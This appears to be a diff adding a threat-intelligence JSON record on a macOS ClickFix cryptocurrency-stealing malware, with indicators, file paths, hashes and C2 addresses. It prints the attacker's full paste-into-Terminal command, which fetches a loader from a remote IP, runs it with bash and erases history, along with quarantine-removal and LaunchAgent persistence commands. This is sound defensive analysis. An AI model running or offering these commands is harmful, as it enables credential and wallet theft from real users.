@@ -1,0 +1,233 @@
+{
+  "malware_family": "ClickFix Crypto Drainer",
+  "threat_actor": "Aeza Group (Infrastructure)",
+  "platforms": [
+    "macos"
+  ],
+  "summary": "A macOS malware delivered through a ClickFix social engineering attack. The initial command downloads a Bash script which profiles the system and fetches a Go-based Mach-O stealer payload. The final payload steals credentials from browsers and the macOS Keychain and is uniquely capable of draining partial amounts from cryptocurrency wallets.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "export SRC_URL='https://profitnow.io/' && (cd /tmp && curl -kfsSL \"http://193.29.224.151/92392991a0cca55?force=1\" -o .UlaccK && bash .UlaccK && rm -f .UlaccK) > /dev/null 2>&1 & clear; printf '\\033[3J'; history -d $(history 1 2>/dev/null | awk '{print $1}') 2>/dev/null; fc -p /dev/null 2>/dev/null;",
+      "context": "Initial ClickFix command pasted into Terminal to download/run loader",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": ".UlaccK",
+      "context": "Temporary loader script downloaded to /tmp",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "mkdir -p \"$HOME/Library/Caches/com.apple.trustd\"",
+      "context": "Profiler/loader script creates masquerading directory",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/Library/Caches/com.apple.trustd/com.apple.verified",
+      "context": "Final payload path for persistence",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "com.apple.verified",
+      "context": "Final payload filename (ARM64)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "xattr -d com.apple.quarantine $HOME/Library/Caches/com.apple.trustd/com.apple.verified",
+      "context": "Loader removes Gatekeeper quarantine attribute from payload",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/Users/<redacted>/Library/Caches/com.apple.softwareupdate/SoftwareUpdate",
+      "context": "Alternative persistence path for payload",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "launchctl bootstrap gui/501 /Users/m1/Library/LaunchAgents/com.apple.softwareupdated.plist",
+      "context": "Persistence via Background Task Management (BTM)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/Users/m1/Library/LaunchAgents/com.apple.softwareupdated.plist",
+      "context": "LaunchAgent plist path for persistence",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Installer is trying to install new software. Enter your password to allow this.",
+      "context": "Text in fake osascript password prompt dialog",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/Library/Caches/homeenergyd/com.apple.homeenergyd",
+      "context": "Filesystem path used by x86_64 malware variant",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "com.apple.homeenergyd",
+      "context": "Stealer executable filename (x86_64)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DRAIN",
+      "context": "Function name for cryptocurrency wallet draining",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DRAIN_PCT",
+      "context": "Variable name controlling percentage of wallet to drain",
+      "specificity": "high",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DRAIN_PCT% to us",
+      "context": "Comment in wallet draining function source code",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "profitnow.io",
+      "context": "Domain used in initial ClickFix command SRC_URL variable",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://193.29.224.151/92392991a0cca55?force=1",
+      "context": "URL for downloading the initial profiler/loader script",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "193.29.224.151",
+      "context": "IP address hosting the profiler/loader script",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "77.221.152.34",
+      "context": "IP address hosting the ARM64 and x86_64 payloads",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "138.124.118.69",
+      "context": "C2 server IP for exfiltration",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "138.124.118.69:8133",
+      "context": "C2 server IP and non-standard HTTP port",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "5bad988affc1094f12b8b8bed659ef55b20e2988eb25441e1c1b34dd03b3eb52",
+      "description": "Profiler/loader Bash script"
+    },
+    {
+      "sha256": "f0062f7e70e61493684a2f60748a475168e155bc2502163c844c42e87692abd0",
+      "description": "ARM64 Mach-O stealer payload (com.apple.verified)"
+    },
+    {
+      "sha256": "619a99ba4ee9d7f33db8045c7e03c4265424977993fe8a53b0f45157c5abd3e5",
+      "description": "x86_64 Mach-O stealer payload (com.apple.homeenergyd)"
+    },
+    {
+      "sha256": "b43a909a01e954d6549558f2f7e9bb58e34959a0ae229f340d61091ab726bbd3",
+      "description": "Persistence payload (SoftwareUpdate)"
+    }
+  ],
+  "file_types": [
+    "macho",
+    "script"
+  ]
+}
